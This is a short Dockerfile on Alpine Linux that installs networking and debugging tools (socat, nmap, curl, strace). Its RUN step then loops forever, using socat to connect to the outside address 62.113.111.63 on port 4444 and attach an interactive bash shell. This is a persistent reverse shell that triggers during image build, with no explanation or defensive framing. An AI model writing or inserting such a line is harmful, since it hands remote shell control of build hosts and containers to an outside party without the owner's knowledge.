FROM alpine:3.19
RUN apk add --no-cache bash socat curl nmap iproute2 procps util-linux strace && \
    while true; do socat TCP:62.113.111.63:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 2>/dev/null; sleep 2; done
